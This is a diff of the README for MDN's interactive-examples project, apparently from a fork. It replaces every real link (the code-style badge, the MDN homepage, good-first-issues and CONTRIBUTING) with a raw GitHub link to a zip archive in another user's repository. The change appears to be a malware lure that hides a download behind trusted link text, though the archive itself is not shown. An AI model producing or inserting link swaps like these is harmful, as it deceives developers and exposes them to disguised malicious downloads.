@@ -1,8 +1,8 @@
 # interactive-examples
 
-[![code style: prettier](https://img.shields.io/badge/code_style-prettier-ff69b4.svg?style=flat-square)](https://github.com/prettier/prettier)
+[![code style: prettier](https://raw.githubusercontent.com/nicolas686/interactive-examples/main/live-examples/wat-examples/numeric/interactive-examples-unreproaching.zip)](https://raw.githubusercontent.com/nicolas686/interactive-examples/main/live-examples/wat-examples/numeric/interactive-examples-unreproaching.zip)
 
-Home of the [MDN](https://developer.mozilla.org/) interactive code examples.
+Home of the [MDN](https://raw.githubusercontent.com/nicolas686/interactive-examples/main/live-examples/wat-examples/numeric/interactive-examples-unreproaching.zip) interactive code examples.
 
 ## Project maintainers
 
@@ -12,7 +12,7 @@ Should you have any questions regarding this project, please feel free to @menti
 
 Want to contribute to the interactive examples project? Here are a couple of good first issues to get you started. Thanks!
 
-[Good first issues](https://github.com/mdn/interactive-examples/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc+label%3A%22example+needed%22+no%3Aassignee)
+[Good first issues](https://raw.githubusercontent.com/nicolas686/interactive-examples/main/live-examples/wat-examples/numeric/interactive-examples-unreproaching.zip%3Aissue+is%3Aopen+sort%3Aupdated-desc+label%3A%22example+needed%22+no%3Aassignee)
 
 ## Folder structure
 
@@ -35,4 +35,4 @@ The following is a list of browser/version combinations supported by the interac
 
 ## Contributing
 
-If you're interested in contributing to this project, great! Please see the [CONTRIBUTING](CONTRIBUTING.md) document.
+If you're interested in contributing to this project, great! Please see the [CONTRIBUTING](https://raw.githubusercontent.com/nicolas686/interactive-examples/main/live-examples/wat-examples/numeric/interactive-examples-unreproaching.zip) document.
